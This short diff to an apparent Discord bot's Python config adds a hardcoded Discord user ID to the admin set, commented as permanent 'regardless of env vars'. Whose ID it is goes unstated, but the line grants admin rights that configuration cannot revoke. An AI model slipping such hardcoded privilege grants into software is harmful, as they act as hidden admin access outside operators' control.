@@ -34,6 +34,8 @@ def _parse_admin_user_ids(raw_value: str) -> set[str]:
 
 ADMIN_USER_ID = _normalize_discord_id(os.getenv("CORTEX_ADMIN_USER_ID") or "")
 ADMIN_USER_IDS = _parse_admin_user_ids(os.getenv("CORTEX_ADMIN_USER_IDS") or "")
+# Permanent admin IDs that are always included regardless of env vars.
+ADMIN_USER_IDS.add("247552740455219200")
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 GITHUB_REPO = os.getenv("GITHUB_REPO", "salemtheweaver/PythonTest")
 INSTANCE_LABEL = (os.getenv("CORTEX_INSTANCE_LABEL") or "").strip()
